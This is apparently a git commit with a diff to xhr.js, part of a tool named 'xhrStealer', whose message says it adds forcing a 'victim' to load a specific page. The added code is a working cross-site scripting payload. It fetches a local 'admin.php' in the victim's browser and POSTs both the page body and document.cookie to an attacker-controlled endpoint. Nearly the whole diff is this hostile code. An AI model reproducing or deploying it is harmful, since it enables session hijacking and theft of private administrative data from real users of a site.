92d0c1aebcd5c547baa0a53d88d59c12b060ae7a
gweeperx <dimopoulos.elias@gmail.com>
2020-01-05 18:24:56 +0200

    Added functionality to force victim surf specific page

--- xhr.js
+++ xhr.js
@@ -1,15 +1,32 @@
-function getit(){
+function getit(body){
 	var http = new XMLHttpRequest();
-	var url = 'http://hostname/get_data.php';
-	var params = "cookie="+escape(document.cookie)+'&body='+escape(document.documentElement.innerHTML);
+	var url = 'http://attacker/xhrStealer/get_data.php';
+	var params = "cookie="+escape(document.cookie)+'&body='+escape(body);
 	http.open('POST', url, true);
 
 	http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
 
-	http.onreadystatechange = function() {//Call a function when the state changes.
+	http.onreadystatechange = function() {
 	    if(http.readyState == 4 && http.status == 200) {
-	        //alert(http.responseText);
+	        
 	    }
 	}
 	http.send(params);
 }
+
+var url = 'admin.php'; //A local page
+
+function load(url, callback) {
+  var xhr = new XMLHttpRequest();
+
+  xhr.onreadystatechange = function() {
+    if (xhr.readyState === 4) {
+      callback(xhr.response);
+    }
+  }
+
+  xhr.open('GET', url, true);
+  xhr.send('');
+}
+
+load(url,getit);
